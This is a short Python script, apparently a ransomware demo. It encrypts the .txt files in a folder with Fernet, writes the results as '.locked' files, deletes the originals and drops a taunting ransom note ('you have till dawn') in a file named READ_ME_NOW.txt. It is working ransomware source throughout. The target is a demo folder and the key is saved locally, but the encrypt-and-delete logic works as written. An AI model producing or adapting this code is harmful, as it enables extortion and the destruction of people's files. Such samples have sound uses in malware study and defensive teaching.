import os
from cryptography.fernet import Fernet

# Generate a key for AES encryption
key = Fernet.generate_key()
fernet = Fernet(key)

with open("secret.key", "wb") as key_file:
    key_file.write(key)

# Folder to encrypt
target_folder = "demo_folder"

for root, dirs, files in os.walk(target_folder):
    for file in files:
        if file.endswith(".txt"):
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            encrypted_file = file_path + ".locked"
            with open(encrypted_file, "wb") as f:
                f.write(encrypted_data)
            os.remove(file_path)  # delete original

ransom_note = """YOUR FILES HAVE BEEN ENCRYPTED!

To get them back, enter the decryption key in our safe decryptor.
(Don't worry, you have till dawn😈😈😈😈🖤)
"""
with open(os.path.join(target_folder, "READ_ME_NOW.txt" ), "w",encoding="utf-8") as f:
    f.write(ransom_note)

print("Files encrypted! Key saved to secret.key")
